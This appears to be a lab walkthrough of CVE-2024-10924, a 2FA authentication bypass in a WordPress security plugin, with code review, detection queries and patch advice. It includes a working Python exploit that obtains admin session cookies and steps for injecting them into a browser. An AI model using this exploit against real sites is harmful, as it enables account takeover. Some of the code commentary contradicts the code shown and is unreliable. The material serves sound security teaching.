# CVE-2024-10924 Vulnerability in WordPress Really Simple Security Plugin

The vulnerability in CVE-2024-10924 arises due to non-adherence to secure coding practices while handling REST API endpoints in the WordPress Really Simple Security plugin. This plugin is widely used to add additional security measures, including Two-Factor Authentication (2FA). Unfortunately, improper validation during the authentication process allows attackers to exploit API endpoints and bypass critical checks.

## WordPress Entry Points

WordPress offers various entry points for interaction:

- **Admin Dashboard**: Used for administrative management via the `/wp-admin` endpoint. Only authenticated users with valid credentials can access this interface.
- **Public Interface**: Managed by the `index.php` file in the root directory, it serves content to visitors.
- **REST API**: The API provides a flexible entry point for developers to manage site data programmatically. It requires proper authentication to access sensitive resources.

The CVE-2024-10924 vulnerability targets REST API endpoints configured for the plugin’s Two-Factor Authentication (2FA) mechanism. It enables attackers to bypass authentication by manipulating parameters used during API interactions. The vulnerability occurred due to insufficient validation of user-supplied values, specifically in the `skip_onboarding` feature.

## How the Vulnerability Works

To understand how the vulnerability works, let's have a source code review to understand the control flow through the different pages. You can review the source code in the `/var/www/html/wp-content/plugins/really-simple-ssl/security/wordpress/two-fa` folder in the attached VM. The plugin contains a PHP class called `Rsssl_Two_Factor_On_Board_Api`, which includes the following essential methods that lead to a bypassing authentication vulnerability:

### Functions Involved for Triggering the Vulnerability

#### `skip_onboarding`

Skips or manages the 2FA onboarding process for a user by validating their credentials and redirecting them after authentication. It begins by extracting parameters from the request, including `user_id`, `login_nonce`, and `redirect_to`. These parameters are then passed to the `check_login_and_get_user` function for validation. If a valid user object is returned, the method calls `authenticate_and_redirect`, redirecting the user to the `redirect_to` URL.

```php
/**
 * Skips the onboarding process for the user.
 *
 * @param WP_REST_Request $request The REST request object.
 *
 * @return WP_REST_Response The REST response object.
 */
public function skip_onboarding( WP_REST_Request $request ): WP_REST_Response {
    $parameters = new Rsssl_Request_Parameters( $request );
    // As a double we check the user_id with the login nonce.
    $user = $this->check_login_and_get_user( (int)$parameters->user_id, $parameters->login_nonce );
    return $this->authenticate_and_redirect( $parameters->user_id, $parameters->redirect_to );
}
```

The vulnerability lies in the `skip_onboarding` method not validating the return value of `check_login_and_get_user`. Even if the function returns null, indicating invalid credentials, the process redirects the user, granting unauthorized access. The call to `skip_onboarding` is carried out through the REST API endpoint `/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding` with POST parameters `user_id`, `login_nonce`, and `redirect_to` URL.

#### `check_login_and_get_user`

The `check_login_and_get_user` function is responsible for validating the `user_id` and `login_nonce`. It first checks the validity of the `login_nonce` using the `verify_login_nonce` function. If the nonce is invalid, it returns null, ensuring an authentication failure. If the nonce is valid, it retrieves the user object associated with the provided `user_id` and returns it.

```php
/**
 * Verifies a login nonce, gets user by the user id, and returns an error response if any steps fail.
 *
 * @param int    $user_id The user ID.
 * @param string $login_nonce The login nonce.
 *
 * @return WP_User|WP_REST_Response
 */
private function check_login_and_get_user( int $user_id, string $login_nonce ) {
    if ( ! Rsssl_Two_Fa_Authentication::verify_login_nonce( $user_id, $login_nonce ) ) {
        return new WP_REST_Response( array( 'error' => 'Invalid login nonce' ), 403 );
    }
}
```

The problem arises because `skip_onboarding` does not properly handle the null response from this function. While the function does its job of identifying invalid credentials, the calling method ignores its return value, allowing the process to continue as if the authentication was successful.

#### `authenticate_and_redirect`

This function redirects the user after successful authentication. It assumes that the earlier methods have already authenticated the user. It uses the `user_id` and `redirect_to` parameters to redirect the user to the desired URL.

```php
/**
 * Sets the authentication cookie and returns a success response.
 *
 * @param int    $user_id The user ID.
 * @param string $redirect_to The redirect URL.
 *
 * @return WP_REST_Response
 */
private function authenticate_and_redirect( int $user_id, string $redirect_to = '' ): WP_REST_Response {
    // Okay checked the provider now authenticate the user.
    wp_set_auth_cookie( $user_id, true );
    // Finally redirect the user to the redirect_to page or to the home page if the redirect_to is not set.
    $redirect_to = $redirect_to ?: home_url();
    return new WP_REST_Response( array( 'redirect_to' => $redirect_to ), 200 );
}
```

However, this function is called even if authentication fails. Therefore, the attacker is seamlessly redirected to the desired page, bypassing the authentication mechanism. Such instances are the first of their kind, and normally, such security flaws have never been seen in a renowned plugin.

It is important to note that the vulnerability only works for the accounts against whom 2FA is enabled. The chain of methods reveals how improper validation leads to a critical security flaw:

- In `skip_onboarding`: The return value from `check_login_and_get_user` is not validated, allowing a null response to be treated as a valid user.
- In `check_login_and_get_user`: While it correctly identifies invalid credentials, it relies on the caller to handle its return value, which does not happen.
- In `authenticate_and_redirect`: It blindly redirects users based on the parameters passed to it, assuming they have been properly authenticated.

Now that we understand the concept behind the vulnerability, let's exploit it in the next task.

## Exploiting CVE-2024-10924

Exploiting this vulnerability is straightforward and involves sending a crafted POST request to the vulnerable `/reallysimplessl/v1/two_fa/skip_onboarding` endpoint. From the previous task, we learned that the endpoint accepts three key parameters: the user's ID attempting to skip 2FA onboarding, a nonce value which is not validated correctly, and the URL to redirect the user after the operation.

### Exploiting WordPress Admin Panel through a POST Call

In the attached VM, open the browser and visit the website `http://vulnerablewp.thm:8080/wp-admin`. We will see that the website is protected through a login panel. Our goal is to retrieve credentials against a WordPress user `admin` with `user_id` 1.

Below is a simple Python script that sends a POST request to the vulnerable endpoint. This script extracts and displays the cookies in response to authenticate the user.

```python
import requests
import urllib.parse
import sys

if len(sys.argv) != 2:
    print("Usage: python exploit.py <user_id>")
    sys.exit(1)

user_id = sys.argv[1]

url = "http://vulnerablewp.thm:8080/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding"
data = {
    "user_id": int(user_id),  # User ID from the argument
    "login_nonce": "invalid_nonce",  # Arbitrary value
    "redirect_to": "/wp-admin/"  # Target redirection
}

# Sending the POST request
response = requests.post(url, json=data)

# Checking the response
if response.status_code == 200:
    print("Request successful!\n")
    
    # Extracting cookies
    cookies = response.cookies.get_dict()
    count = 1

    for name, value in cookies.items():
        decoded_value = urllib.parse.unquote(value)  # Decode the URL-encoded cookie value
        print(f"Cookie {count}:")
        print(f"Cookie Name: {name}")
        print(f"Cookie Value: {decoded_value}\n")
        count += 1
else:
    print("Request failed!")
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")
```

The above Python code is already available on the Desktop of the attached VM with the name `exploit.py`. Open the terminal and execute the script using the following command:

```sh
ubuntu@tryhackme:~/Desktop$ python3 exploit.py 1
```

Output:
```
Request successful!

Cookie 1:
Cookie Name: wordpress_logged_in_eb51341dc89ca85477118d98a618ef6f
Cookie Value: admin|1734510575|oROXr3wB4mKDymD0koHZenGeStwYsqZbMcWqOlm4QI
Cookie 2:
Cookie Name: wordpress_eb51341dc89ca85477118d98a618ef6f
Cookie Value: admin|1734510575|oROXr3wB4mKDymD0koHZenGeStwYsqZbMcWqOlm4QI2|c29b74eaa
```

The above script sends a POST request to the WordPress endpoint and retrieves the authenticated cookie values for the specified `user_id`, with 1 typically being assigned to the first user on the website.

Note: The cookie values in the output above are intentionally omitted for the `user_id` 1.

### From Cookies to Admin Login

Now, we will use the cookies retrieved earlier to log in as admin on the WordPress site. While on the `vulnerablewp.thm:8080` page, you can manually inject the cookies into Firefox. To do this, right-click on the page and select Inspect, then open the browser's developer tools.

Once the Developer Tools panel is open, look for the Storage tab at the top. Click on it to access the storage-related data. Locate and expand the Cookies section on the left-hand sidebar of the Storage tab. Under Cookies, you will see a list of domains for which cookies are stored. Select `http://vulnerablewp.thm:8080` from this list to view all cookies associated with the site.

With the cookies table visible, you can now add the cookies retrieved earlier. To do this, click on the plus sign (+) and a new row will appear in the table. Start by double-clicking the empty Name field in the new row and paste the name of the cookie, such as `wordpress_logged_in_xxx`. After pasting the cookie name, double-click the empty Value field and paste the cookie value you retrieved earlier. For example, a typical value might look like `admin|1734424855|GmsuEza35K2GtvS57bhIVl5CbFZKVlpuYxEbIYVLk4`. Repeat the same step for the other cookie as well.

After adding the cookies, close the Developer Tools panel, enter the WordPress admin dashboard link `http://vulnerablewp.thm:8080/wp-admin` in the address bar, and press Enter. This will apply the injected cookies to your session. When the page reloads, you should be logged in as the `user_id` 1. If everything was done correctly, you will see the admin interface.

Once logged in as the `user_id` 1, navigate to this link to get details about your profile, such as your username, email address, and personal settings.

### Adding Cookies in Browser

There are multiple ways to add cookies in the browser. If you have difficulty using the above method, you can add cookies to the browser using an extension like Cookiebro Editor. Follow the steps provided in the extension below to add or edit cookies. Ensure the expiration date for the cookies is set to a future value to keep them valid.

Click here to watch the walkthrough for injecting cookies using a super easy Firefox extension!

Now that you understand how to exploit the vulnerability, let's review some mitigation measures for prevention.

## Detection and Mitigation Techniques

In the previous task, we learned that the vulnerability in CVE-2024-10924 can be exploited by making a simple API call to a specific endpoint. Now, we will discuss a few detection and mitigation techniques. The challenge lies in detecting such exploitation, as legitimate API calls to the endpoint can also occur, making distinguishing between normal and malicious activity difficult.

### Examining Logs

To identify exploitation attempts of CVE-2024-10924, we can rely on various logs that capture API activity, events, etc. Below are some methods to examine logs for potential exploitation:

- **Check Weblogs for API Calls**: Focus on detecting requests to the vulnerable endpoint, `/?rest_route=/reallysimplessl/v1/two_fa/skip_onboarding` with unusual patterns like repeated POST requests to the endpoint, requests with varying `user_id` or `login_nonce` parameters, indicating brute force attempts, etc.
- **Analyze Authentication Logs**: Look for login attempts where two-factor authentication is bypassed. Indicators of potential exploitation include failed login attempts followed by a sudden successful login without 2FA validation, logins to administrative accounts from unexpected geolocations or devices, etc.
- **SIEM Query**: If you are using a SIEM solution like OpenSearch, create a query to filter and visualize logs for potential exploitation attempts. A sample query could be:
  ```sh
  method:POST AND path:"/reallysimplessl/v1/two_fa/skip_onboarding"
  ```
  Note: If the above query generates results, it does not necessarily confirm exploitation. However, when combined with other indicators, like previous suspicious requests, it can provide better insight into potential attacks.

### Mitigation Steps

As part of the mitigation process, the developers of the Really Simple Security plugin have officially released a patch addressing CVE-2024-10924. A source code review of the updated version reveals that additional validation and error-handling steps have been implemented to handle the authentication bypass.

Here are some additional mitigation measures to secure your website:

- **Apply the Official Patch**: Update the Really Simple Security plugin to version 9.1.2 or later, which includes a fix for the vulnerability and also enables auto-updates.
- **Update the Alerts in the SIEM**: Ensure you are notified as soon as an exploitation attempt is made.
- **Implement Proper Input Validation**: Developers must implement proper input validation and rigorous error handling for all API endpoints to prevent the processing of malicious or invalid parameters.